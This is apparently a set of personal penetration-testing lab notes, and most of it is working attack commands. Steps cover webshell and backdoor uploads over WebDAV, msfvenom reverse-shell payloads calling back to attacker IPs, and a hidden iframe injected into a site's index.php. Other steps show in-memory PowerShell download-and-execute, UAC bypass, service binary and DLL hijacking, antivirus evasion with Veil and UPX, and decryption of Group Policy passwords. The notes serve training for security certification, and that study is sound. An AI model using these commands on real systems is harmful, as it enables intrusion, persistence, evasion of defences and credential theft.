    <span class="k">die</span><span class="p">(</span><span class="s1">'File uploaded successfully.'</span><span class="p">);</span>
<span class="p">}</span><span class="cp">?&gt;</span>

<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">'post'</span> <span class="na">enctype=</span><span class="s">'multipart/form-data'</span><span class="nt">&gt;</span>
    File: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">'file'</span> <span class="na">name=</span><span class="s">'file_upload'</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload Image"</span> <span class="na">name=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>

</code></pre></div></div>

<ul>
  <li>
    <p>Send the script to the vulnerable http URL
// Upload the msfvenom payload</p>
  </li>
  <li>
    <p>set a listener</p>
  </li>
</ul>

<blockquote>
  <p>we have a meterpreter session</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load sniffer
sniffer_interfaces
sniffer_start 2 //let it run For 5 minutes
sniffer_stop 2 
sniffer_dump 2 sniff2.pcap
wireshark sniff2.pcap
</code></pre></div></div>

<blockquote>
  <p>[+] if sniffer has error, we need to gain system first</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use post/multi/recon/local_exploit_suggester
use exploit/windows/local/ms10_015_kitrap0d
set session 4
set LHOST &lt;tap0 ip&gt;
set LPORT 4444
run
getsystem
</code></pre></div></div>

<ul>
  <li>read the pcap file
statistcs &gt; Endpoints
we found 2 more address
192.168.78.5
192.168.78.25</li>
</ul>

<p>There are two different Metasploit modules that we can use to achieve the goal of client exploitation.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    auxiliary/server/browser_autopwn
    exploit/multi/browser/java_rhino
</code></pre></div></div>

<p>This gives us a URL that we can use to exploit the target organization corporate network.</p>

<p>Next, we inject a hidden iframe in the members area home page that loads our malicious page each time someone visits the page.</p>

<p>To insert the code, we can use the Meterpreter session to download the index.php file. Then, we can add the following code, and re-upload the index.php file to the web server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    if (isset($_GET['pag'])){
        $variabile1=$_GET['pag'];
        include($variabile1);

    echo '&lt;iframe src="http://172.16.5.20:8081/uo3eXen8t0I1n" width=1 height=1 style="visibility:hidden; position:absolute;"&gt;&lt;/iframe&gt;';

    }else{

</code></pre></div></div>

<ul>
  <li>add the script to the index.php, but modify thepayload to the result of your exploit java_rhino</li>
</ul>

<p>// http://172.16.5.20:8081/QNtJ7n</p>

<ul>
  <li>upload the modified index.php</li>
</ul>

<blockquote>
  <p>later we will use the 
auxiliary/server/browser_autopwn
to more results</p>
</blockquote>

<h4 id="2nd-time-1">2nd time</h4>

<ul>
  <li>to find the authentication type in a web environment
 → davtest -url http://demo.ine.local/webdav
 // We can notice that /webdav folder is secure with basic authentication.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Metasploit http_login module to discover the username and password to access the folder.
- msfconsole -q
- use auxiliary/scanner/http/http_login
- set RHOSTS demo.ine.local
- set AUTH_URI /webdav/
- set USER_FILE  /usr/share/metasploit-framework/data/wordlists/common_users.txt
- set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
- set VERBOSE false
- exploit
</code></pre></div></div>

<p>Lets run the davtest and enumerate the /webdav folder \for uploadable and executable files.</p>

<p>→ davtest -auth administrator:tigger  -url http://demo.ine.local/webdav</p>

<blockquote>
  <p>Lets upload an .asp backdoor on the target machine to /webdav directory using cadaver utility.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cadaver http://demo.ine.local/webdav
Username: administrator
Password: tigger
ls
</code></pre></div></div>

<ul>
  <li>now we can interact with the cadaver tool</li>
  <li>
    <p>lets upload a webshell.asp backdoor
 → put /usr/share/webshells/asp/webshell.asp</p>
  </li>
  <li>
    <p>we can access the web browser and insert commands
 → http://demo.ine.local/webdav/webshell.asp?cmd=whoami</p>
  </li>
  <li>
    <p>lets get a better shell
 → msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.6 LPORT=4444 -f exe &gt; backdoor.exe</p>
  </li>
  <li>
    <p>now we can upload this malicious file using cadaver
 → put /root/backdoor.exe</p>
  </li>
  <li>open the web to initiate the backdoor.exe</li>
  <li>
    <p>http://demo.ine.local/webdav/webshell.asp?cmd=dir+c%3A%5C</p>
  </li>
  <li>after some trial and error, we found the url</li>
  <li>
    <p>C:\inetpub\wwwroot\webdav\backdoor.exe</p>
  </li>
  <li>
    <p>start a listener in meterpreter
 → use exploit/multi/handler</p>
  </li>
  <li>now we can execute the backdoor</li>
  <li>C:\inetpub\wwwroot\webdav\backdoor.exe</li>
</ul>

<h5 id="pos-exploitation">pos exploitation</h5>
<ul>
  <li>we have meterpreter shell</li>
  <li>getuid</li>
  <li>sysinfo</li>
  <li>getsystem // to elevate the privileges
// it failed</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- shell
- whoami /all
</code></pre></div></div>

<blockquote>
  <p>SeImpersonatePrivilege is enabled</p>
</blockquote>

<ul>
  <li>first - migrate the process</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	CTRL + C
	migrate -N w3wp.exe
</code></pre></div></div>

<ul>
  <li>lets load incognito</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   → load incognito
   → list_tokens -u
</code></pre></div></div>

<blockquote>
  <p>administrator is available to impersonation</p>
</blockquote>

<ul>
  <li>impersonate_token DOTNETGOST\Administrator</li>
</ul>

<blockquote>
  <p>we have root access</p>
</blockquote>

<p>References</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    DAVTest (https://github.com/cldrn/davtest)
    Cadaver (https://github.com/grimneko/cadaver)
    ASP Webshell (https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp)
</code></pre></div></div>

<h3 id="lab-privesc">lab privesc</h3>

<h4 id="bypass-uac">bypass UAC</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use post/windows/gather/win_privs
use exploit/windows/local/bypassuac

post/multi/recon/local_exploit/suggester
	exploit/windows/local/ms10_092_schelevator &gt; vulnerable
</code></pre></div></div>

<h4 id="bypass-uac-manually">bypass UAC manually</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.50 LPORT=4700 -f exe --platform Windows &gt; shell.exe
</code></pre></div></div>

<ul>
  <li>
    <p>upload the payload from msfvenom and the bypassuac found in this dir (/usr/share/metasploit-framework/data/post) // ofc must be the right OS version</p>
  </li>
  <li>
    <p>open a listener with the same options as the msfvenom payload</p>
  </li>
</ul>

<p>go to the session</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
bypassuac-x64.exe /c C:\Users\eLS\Desktop\shell.exe
</code></pre></div></div>

<ul>
  <li>we can go to the new meterpreter session
  getsystem</li>
  <li>
    <p>now we have SYSTEM privileges bypassing UAC manually</p>
  </li>
  <li>With system privileges we can run incognito and impersonate a token</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load incognito
list_tokens -u
impersonate_token &lt;system\\users&gt;
</code></pre></div></div>

<blockquote>
  <p>Dont forget the double \</p>
</blockquote>

<h4 id="privesc">privesc</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>migrate to the explorer.exe
ps -S explorer.exe
migrate &lt;PID&gt;

</code></pre></div></div>

<blockquote>
  <p>we can also use migrate -N <name of="" process=""></name></p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getsystem //failed

shell
net localgroup administrators
we can bypass UAC with
→ UACMe Tool = https://github.com/hfiref0x/UACME
</code></pre></div></div>

<ul>
  <li>For that we need to create a malicious file
 → msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe &gt; ‘backdoor.exe’</li>
</ul>

<h4 id="go-to-temp-folder-and-upload-the-files">go to temp folder and upload the files</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CTRL + C
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls
</code></pre></div></div>

<ul>
  <li>open a handler in meterpreter</li>
  <li>then execute the Akagi64.exe file</li>
</ul>

<p>shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe</p>

<blockquote>
  <p>moreover IFileOperation UAC Bypass = : https://www.fuzzysecurity.com/tutorials/27.html</p>
</blockquote>

<blockquote>
  <p>we have a shell
then getsystem to get a better privileged shell</p>
</blockquote>

<h4 id="with-meterpreter">with Meterpreter</h4>
<p>// the same task can be done with metasploit post module</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run post/multi/recon/local_exploit_suggester
use exploit/windows/local/bypassuac_dotnet_profiler 
</code></pre></div></div>

<h3 id="lab-privesc-via-services">Lab Privesc via Services</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.100 LPORT=4700 -f exe &gt; shell.exe
</code></pre></div></div>

<p>C:\Program Files\OpenVPN\bin</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run winenum
run post/windows/gather/win_privs
// net start
</code></pre></div></div>

<p>To escalate privileges, we should find and exploit services that:</p>

<ol>
  <li>run with higher privileges</li>
  <li>automatically start at boot
  OR can be restarted (with lower privileges)
  OR are vulnerable to DoS (meaning that we can cause the service to crash and let Windows to automatically restart it)</li>
  <li>have their binaries in paths where we have write privileges.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;cd C:\Users\els
cd C:\Users\els

C:\Users\els&gt;wmic service &gt; serv_list.txt
wmic service &gt; serv_list.txt
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service WHERE "NOT PathName LIKE '%system32%'" GET PathName, Name &gt; filter_service.txt
</code></pre></div></div>

<blockquote>
  <p>there is 12 services, in the real world we need to test all these 12 services
 to see if we have write permission in one of them</p>
</blockquote>

<h4 id="verify-if-you-have-m-write--modify-permissions">Verify if you have (M) write / modify permissions</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls "C:\Program Files\OpenVPN\bin\openvpnserv.exe"

C:\Windows\system32&gt;icacls "C:\Program Files\OpenVPN\bin\openvpnserv.exe"
icacls "C:\Program Files\OpenVPN\bin\openvpnserv.exe"
C:\Program Files\OpenVPN\bin\openvpnserv.exe els-PC\els_user:(I)(M)
                                             BUILTIN\Administrators:(I)(F)
                                             NT AUTHORITY\SYSTEM:(I)(F)
                                             BUILTIN\Users:(I)(RX)
</code></pre></div></div>

<h4 id="verify-if-run-as-localsystem">Verify if run as LocalSystem</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>we can search in the first serv_list file ``` sc qc &lt;service&gt; ```
</code></pre></div></div>

<blockquote>
  <p>make a payload from msfvenom with the same name as our target service
change the name of the original to a backup
mv openvpnserv.exe openvpnserv.exe.bkp
upload the malicious payload
open a listener
now we can reboot the machine - but this is not stealthy
from meterpreter &gt; reboot -f 2</p>
</blockquote>

<h4 id="sequence-of-death">Sequence of death</h4>

<ul>
  <li>we need to set a handler with a autorun to migrate to another process (2 options)
    <ol>
      <li>msf exploit(handler) &gt; set AutoRunScript explorer.exe</li>
      <li>msf exploit(handler) &gt; set AutoRunScript migrate -f</li>
    </ol>
  </li>
</ul>

<blockquote>
  <p>msfvenom payload, adding a malicious payload in the original openvpnserv.exe file</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.100 LPORT=4460 -f exe -e x86/shikata_ga_nai -i 15 -k -x openvpnserv.exe.bkp&gt; openvpnserv.exe
</code></pre></div></div>

<blockquote>
  <p>then we can upload the file to the machine
and reboot -f 2
wait For the session in meterpreter</p>
</blockquote>

<blockquote>
  <p>Try harder <strong>-.-</strong></p>
</blockquote>

<h4 id="2nd-time-2">2nd time</h4>

<ul>
  <li>
    <p>For example, if u have access to the system and go to shell to see if the user has administrator privileges
 → net localgroup administrators
 // but it failed</p>
  </li>
  <li>
    <p>so we can execute an enumerate tool such as PowerUp.ps1</p>
  </li>
  <li>open a web server</li>
  <li>load powershell on the meterpreter session, so we can load PowerUp script in the memory</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">load</span><span class="w"> </span><span class="nx">powershell</span><span class="w">
</span><span class="n">powershell_shell</span><span class="w">
</span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://10.10.15.3/PowerUp.ps1'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>lets run the powerup.ps1</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke0AllChecks
</code></pre></div></div>

<blockquote>
  <p>Now, there are two ways to abuse the service.</p>
</blockquote>

<p>1.): We can create a new user on the target machine with administrator privileges and use that.
2.): We can run the command as the highest privilege available to that service.</p>

<p>Both can be done using the <strong>Invoke-ServiceAbuse</strong> command using powershell.</p>

<h5 id="add-an-existente-user">add an existente user</h5>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-ServiceAbuse -Name AppReadiness -Command "net localgroup administrators bob /add"
net localgroup administrators 
</code></pre></div></div>

<h5 id="create-a-new-user">create a new user</h5>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Invoke-ServiceAbuse -Name AppReadiness  -UserName ine -Password password_123 -LocalGroup "Administrators"
- net user
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole -q
use exploit/windows/misc/hta_server
show options
run &gt; grab the url
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-ServiceAbuse -Name AppReadiness  -Command "mshta.exe http://10.10.15.3:8080/ljUAsN.hta"
</code></pre></div></div>

<blockquote>
  <p>we have a new meterpreter session with system privileges</p>
</blockquote>

<h3 id="finding-and-exploiting-dll-hijacking-vulnerabilities">Finding and Exploiting DLL Hijacking Vulnerabilities</h3>

<p>172.16.48.100</p>

<p>C:\Program Files (x86)\Agnitum\Outpost Firewall 1.0\outpost.exe</p>

<h4 id="process-explorer-1">Process Explorer</h4>
<p>first we open this with administrator privileges
search For an application that is running with system privileges, a third party application
go to the properties, copy the path
check the security of the application and the folder where it is installed
check if the user have access</p>

<h4 id="proc-monitor-1">Proc monitor</h4>
<p>go to filter
add Process Name = <the process="" you="" found="">
add Result = NAME NOT FOUND
add path contains = dll
kill the process with process explorer
open cmd with administrator privileges
restart the process = net start OutpostFirewall
go to the proc monitor &gt; should appear some processes
we need to choose one that is running with system priveleges
and we must have access to the dll folder path
in this case there is two &gt; UxTheme.dll and imageres.dll
// we have everything we need, we can log in as lowpriv user and exploit</the></p>

<h4 id="payload-1">Payload</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_https LHOST=&lt;kali IP&gt; LPORT=4444 -f dll &gt; UxTheme.dll
</code></pre></div></div>

<p>in this case we generate a 32-bit payload because the outpost.exe is 32-bit
we can use windows/meterpreter/rever_tcp, is more reliable but less stealthy</p>

<h4 id="send-the-payload-to-the-target-1">send the payload to the target</h4>

<p>open a web server:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span>
</code></pre></div></div>

<p>grab the file in the target machine:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://&lt;attacker_IP&gt;/UxTheme.dll'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\Program Files (x86)\Agnitum\Outpost Firewall 1.0\UxTheme.dll'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<h4 id="handler-1">Handler</h4>
<p>set a listener in meterpreter
restart the machine&gt; shutdown /r /t 0</p>

<p>we should get a shell back
	// it took +/- 4 minutes</p>

<h4 id="2nd-time-3">2nd time</h4>

<p>in Process Monitor Tool:
Step 4: Now, lets apply a “CreateFile” filter to see all the missing files.</p>

<p>Right-click on “CreateFile” → Include ‘CreateFile’</p>

<blockquote>
  <p>It shows <strong>NAME NOT FOUND</strong> which means the path mentioned in the same row is missing.</p>
</blockquote>

<ul>
  <li>make sure u have write access to that folder</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ACL 'C:\Users\Administrator\Desktop\dvta\bin\Release' | Format-List
</code></pre></div></div>

<p>restart the procMon
add another filter = ctrl+L
process Name is <name.exe> - add
Operation is CreateFile</name.exe></p>

<blockquote>
  <p>Right-click on <strong>NAME NOT FOUND</strong> → Include <strong>NAME NOT FOUND</strong></p>
</blockquote>

<ul>
  <li>add another filter: ctrl+L</li>
  <li>Path begins with <path of="" the="" file=""></path></li>
  <li>see which .dll file is missing (in this case there is 2, both can be exploitable)</li>
</ul>

<h5 id="msfvenom">msfvenom</h5>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f dll &gt; Dwrite.dll
</code></pre></div></div>

<ul>
  <li>open a web server</li>
</ul>

<p>to grab the file and copy into the directory (in Windows)</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iwr</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://10.10.15.2/Dwrite.dll</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll</span><span class="w">
</span></code></pre></div></div>

<p>References</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Process Monitor (https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
Metasploit (https://www.metasploit.com/)
DVTA (https://github.com/secvulture/dvta)
</code></pre></div></div>

<h3 id="lab-bypassing-av">Lab Bypassing AV</h3>

<p>// (Avast and Microsoft Security Essentials)</p>

<p>Victim01-Avast: 172.16.5.10
Victim02-MSE: 172.16.5.5
Pentester (Your Machine): 172.16.5.50</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdp:
	admin
	et1@sR7!
</code></pre></div></div>

<h4 id="without-av">without AV</h4>
<p>we did a regular msfvenom payload 
send to the target 
setup a handler
and execute it
we got a meterpreter shell back
now we can For example:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>execute -f calc.exe
sysinfo 
getuid
etc
</code></pre></div></div>

<p>grab the file in the web server</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/&lt;file&gt;'</span><span class="p">,</span><span class="w"> </span><span class="s1">'&lt;path you wanna save/outputfile&gt;'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>// or open the browser http://<kali ip="">/</kali></p>

<h4 id="trying-to-bypass-av---avast">Trying to bypass AV - Avast</h4>
<p>1 attempt: regular payload</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.50 LPORT=4444 -f exe &gt; payload.exe)
AV caught
</code></pre></div></div>

<p>2 attempt: encoded payload</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(-e x86/shikata_ga_nai -i 5)
AV caught
</code></pre></div></div>

<blockquote>
  <p>upx –best –ultra-brute -f rTCPenc.exe -o rTCPenc2.exe</p>
</blockquote>

<h4 id="bypass-av---avast--mse">Bypass AV -&gt; (Avast &amp; MSE)</h4>

<p>3 attempt: using Veil</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
</code></pre></div></div>

<h5 id="if-necessary">if necessary</h5>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chown root -R wine/ OR // chown root:root -R /var/lib/veil/wine
apt install winbind
</code></pre></div></div>

<p>Veil:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use 1 = evasion
list = to list the available payloads
use 28 = python/meterpreter/rev_tcp.py
// set LPORT 4444 // set LHOST &lt;kali ip&gt;
insert a name For your payload
1 = to use the default PyInstaller
</code></pre></div></div>

<blockquote>
  <p>send the payload to the target and execute it
 we should get a shell back even tho the AV is enabled</p>
</blockquote>

<blockquote>
  <p>the same veil payload bypassed the MSE (Microsoft Security Essentials)</p>
</blockquote>

<ul>
  <li>4 atempt
if its not enough
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upx --best --ultra-brute -f rTCPveil.exe -o rTCPveil2.exe
</code></pre></div>    </div>
  </li>
</ul>

<blockquote>
  <p>we need to pack the veil file with UPX
there is always something more that we can try</p>
</blockquote>

<h5 id="good-to-know">Good to know</h5>

<blockquote>
  <p>We do not recommend that you upload your malicious files generated by any source (msfvenom, veil, etc.) to online AV scanners like www.virustotal.com, thus, because later on these files are shared with AV companies who will be able to create signatures to catch them. The best thing to do is first, find out what your targets customer use as AV solution (see job posts and forums in order to see if its published somewhere. You may also use your social engineering skills (call and ask) and you will be surprised how people share this information without any concerns. Then download a trial version of the AV solution used by your customer in a lab environment and update it to the latest virus definition. Once you are able to bypass it, you can deliver the piece of code considering that its part of your engagements scope.</p>
</blockquote>

<ul>
  <li>References
  https://github.com/Veil-Framework/Veil
  https://upx.github.io/</li>
</ul>

<h3 id="lab-from-xss-to-domain-admin">Lab From XSS to Domain Admin</h3>

<p>myip 172.16.111.30
blog.fooresearch.site (172.16.111.1)</p>

<p>task 1 - beEF-XSS</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	&lt;script src="http://172.16.111.30:3000/hook.js"&gt;&lt;/script&gt;
</code></pre></div></div>

<p>Commands &gt; Host &gt; Get System Info &gt; java 1.7.0_17 is installed</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf &gt; use exploit/multi/browser/java_jre17_provider_skeleton

set srvhost and lhost = your kali ip
set srvport and lport = as you wish, but it must be different
</code></pre></div></div>

<h4 id="send-the-payload">send the payload</h4>
<p>two options:
	you can re-use the XSS in the blog
	you can inject an invisible iframe in the hooked browser</p>

<p>with second option:
	beEF &gt; Commands &gt; Misc &gt; Create Invisible Iframe &gt; paste the URL from the msf payload</p>

<h4 id="in-meterpreter-shell">in meterpreter shell</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getuid 
sysinfo
ifconfig &gt; there is another network : 192.168.200.210
</code></pre></div></div>

<p>with shell:
set = to show the variables in the target</p>

<blockquote>
  <p>[!NOTE] look For:
LOGONSERVER, USERDNSDOMAIN, USERDOMAIN, USERNAME</p>
</blockquote>

<p>with meterpreter:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load extapi
adsi_computer_enum examplead.lan
adsi_user_enum
</code></pre></div></div>

<h4 id="credential-stealing">Credential Stealing</h4>
<p>AD policies are stored in a special UNC path:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%USERDNSDOMAIN%\Policies
</code></pre></div></div>

<p>You cannot access UNC paths via cmd, use the Sysvol share you can find on a DC:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%LOGONSERVER%\Sysvol
</code></pre></div></div>

<p>drop to shell:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use X: \\DC01\SysVol = to mount the SysVol on the DC as a drive called X
X: = to go to the mounted drive
cd examplead.lan\Policies
dir /s *.xml = we need to search the groups.xml in this directory
</code></pre></div></div>

<p>X:\examplead.lan\Policies{69BCC2AD-B7E5-4E02-833D-DBFDD19E7EB4}\Machine\Preferences\Groups</p>

<blockquote>
  <p>those files contain information about local users and groups deployed via group policies
System administrators usually use AD policies to deploy a local administrator account in a domain environment
Those files also contain information about usernames, encrypted passwords and the groups</p>
</blockquote>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type <span class="nt">&lt;full</span> <span class="err">path</span> <span class="err">of</span> <span class="err">the</span> <span class="err">groups</span><span class="nt">&gt;</span>\Groups.xml

	<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="nt">&gt;&lt;User</span> <span class="na">clsid=</span><span class="s">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="na">name=</span><span class="s">"LADM"</span> <span class="na">image=</span><span class="s">"0"</span> <span class="na">changed=</span><span class="s">"2014-07-31 12:11:27"</span> <span class="na">uid=</span><span class="s">"{02526B4C-A2A5-48D9-A357-80B0D8E9825D}"</span><span class="nt">&gt;&lt;Properties</span> <span class="na">action=</span><span class="s">"C"</span> <span class="na">fullName=</span><span class="s">""</span> <span class="na">description=</span><span class="s">""</span> <span class="na">cpassword=</span><span class="s">"0cU/uGQrF5Xfhm61HAK8wFlfYce2W6ODQAeI957VrqY"</span> <span class="na">changeLogon=</span><span class="s">"0"</span> <span class="na">noChange=</span><span class="s">"0"</span> <span class="na">neverExpires=</span><span class="s">"1"</span> <span class="na">acctDisabled=</span><span class="s">"0"</span> <span class="na">userName=</span><span class="s">"LADM"</span><span class="nt">/&gt;&lt;/User&gt;</span>
        <span class="nt">&lt;Group</span> <span class="na">clsid=</span><span class="s">"{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}"</span> <span class="na">name=</span><span class="s">"Administrators"</span> <span class="na">image=</span><span class="s">"2"</span> <span class="na">changed=</span><span class="s">"2014-07-31 12:11:54"</span> <span class="na">uid=</span><span class="s">"{AEAF1E3C-2DC1-4206-A907-6064727BB08A}"</span><span class="nt">&gt;&lt;Properties</span> <span class="na">action=</span><span class="s">"U"</span> <span class="na">newName=</span><span class="s">""</span> <span class="na">description=</span><span class="s">""</span> <span class="na">deleteAllUsers=</span><span class="s">"0"</span> <span class="na">deleteAllGroups=</span><span class="s">"0"</span> <span class="na">removeAccounts=</span><span class="s">"0"</span> <span class="na">groupName=</span><span class="s">"Administrators"</span><span class="nt">&gt;&lt;Members&gt;&lt;Member</span> <span class="na">name=</span><span class="s">"LADM"</span> <span class="na">action=</span><span class="s">"ADD"</span> <span class="na">sid=</span><span class="s">""</span><span class="nt">/&gt;&lt;/Members&gt;&lt;/Properties&gt;&lt;/Group&gt;</span>
<span class="nt">&lt;/Groups&gt;</span>

</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LADM = user
0cU/uGQrF5Xfhm61HAK8wFlfYce2W6ODQAeI957VrqY = encrypted password
GroupName = administrator
</code></pre></div></div>

<h4 id="decrypt-the-password">Decrypt the password</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpp-decrypt 0cU/uGQrF5Xfhm61HAK8wFlfYce2W6ODQAeI957VrqY
Pm2fUXScqI
</code></pre></div></div>

<h4 id="back-to-meterpreter">back to meterpreter</h4>
<p>run post/windows/gather/enum_computers
//there is 3 computers in the network</p>

<blockquote>
  <p>we can run a port sweep or a portscan, but before that we need to add the route to the machine we own</p>
</blockquote>

<p>background</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>route add 192.168.200.0 255.255.255.0 1
use auxiliary/scanner/smb/smb_version
	set rhosts 192.168.200.100,200,210
</code></pre></div></div>

<blockquote>
  <p>one is windows 2008, an unidentified host, one windows 7 that we already have access
we cant use psexec because we do not have domain admin access
so we need to create a executable payload and send to the machine</p>
</blockquote>

<h4 id="create-a-payload">Create a payload</h4>
<p>use payload/windows/meterpreter/reverse_tcp
set options</p>
